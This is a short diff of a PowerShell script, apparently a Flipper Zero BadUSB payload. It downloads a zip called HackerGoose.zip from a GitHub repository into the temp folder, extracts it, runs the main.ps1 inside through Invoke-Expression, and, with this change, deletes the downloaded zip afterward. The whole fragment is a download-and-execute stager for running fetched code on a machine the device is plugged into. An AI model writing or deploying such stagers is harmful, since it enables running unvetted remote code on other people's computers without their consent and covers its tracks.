@@ -10,15 +10,13 @@ $ZipUrl = 'https://github.com/6uard1an/Cool-FLipper-Zero-BadUSB-s/raw/main/Hacke
 # Download the zip file
 Invoke-WebRequest -Uri $ZipUrl -OutFile "$TempDirectory\HackerGoose.zip"
 
-# Extract the contents of the zip file directly into the temporary directory
-$zipDestination = $TempDirectory
-
-# Use .NET ZipFile class to extract the contents
+# Extract the contents of the "hg" folder directly into the temporary directory
 Add-Type -AssemblyName System.IO.Compression.FileSystem
-[System.IO.Compression.ZipFile]::ExtractToDirectory("$TempDirectory\HackerGoose.zip", $zipDestination)
+[System.IO.Compression.ZipFile]::ExtractToDirectory("$TempDirectory\HackerGoose.zip", $TempDirectory)
 
 # Build the full path to main.ps1
-$mainScriptPath = Join-Path $zipDestination "hg\main.ps1"
+$mainScriptPath = Join-Path $TempDirectory "hg\main.ps1"
 
 # Run the main.ps1 script
 Invoke-Expression -Command $mainScriptPath
+Remove-Item -Path (Join-Path $env:TEMP "HackerGoose.zip")
